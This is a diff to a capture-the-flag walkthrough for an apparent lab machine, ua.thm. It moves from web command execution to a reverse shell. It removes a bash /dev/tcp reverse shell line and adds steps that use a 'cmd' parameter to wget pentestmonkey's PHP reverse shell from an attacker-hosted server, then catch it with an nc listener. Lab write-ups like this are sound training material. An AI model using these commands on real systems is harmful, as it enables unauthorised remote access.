@@ -149,8 +149,16 @@ The magic wand in CyberChef triggers "magic mode" which automatically detects th
 ## Remote command execution (RCE) to reverse shell
 Right now, we have RCE through our browser, but our ability to move through the victim machine's files and change users is nearly nonexistent. We need to acquire a reverse shell; in other words, we need to gain remote access to a user account on the victim machine.
 
-First, we need to create the script for our reverse shell:
-```
-#!/bin/bash
-bash -c "sh -i >& /dev/tcp/10.2.2.108/1234 0>&1"
-```
+First, we need to download the script for our reverse shell. I would suggest downloading pentestmonkey's PHP reverse shell, which can be found here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
+
+On your attacker machine, make sure you are in the same directory as your reverse shell. Then use `nano php-reverse-shell.php` to open this file. Navigate to line 49 and change the IP to the IP of your attacker machine. Without making this change, the script will give the shell to the wrong machine.
+
+In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.
+
+Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php. (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our shell onto the target machine.
+
+On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.
+
+Return to Firefox and open a new tab. Enter **http://ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.
+
+Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user www-data!
